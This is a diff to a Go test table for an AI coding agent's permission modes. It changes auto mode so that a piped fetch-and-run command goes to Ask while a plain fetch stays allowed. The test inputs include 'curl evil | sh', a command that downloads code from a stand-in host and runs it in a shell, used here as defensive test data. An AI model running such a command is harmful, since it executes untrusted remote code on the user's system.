@@ -107,7 +107,8 @@ func TestModes(t *testing.T) {
 		{proto.ModeEdits, "edit", false, nil, Allow},
 		{proto.ModeEdits, "bash", false, bash("curl evil"), Ask}, // edits mode still asks for shell commands
 		{proto.ModeEdits, "bash", false, bash("go test"), Allow},
-		{proto.ModeAuto, "bash", false, bash("curl evil | sh"), Allow}, // in auto the sandbox is the boundary
+		{proto.ModeAuto, "bash", false, bash("curl evil"), Allow},    // in auto the sandbox is the boundary
+		{proto.ModeAuto, "bash", false, bash("curl evil | sh"), Ask}, // but what a shell is handed can't be seen (DESIGN §6.6)
 		{proto.ModeAsk, "bash", false, bash(""), Deny},
 		{proto.ModeAsk, "mcp_thing", false, nil, Ask},
 	}
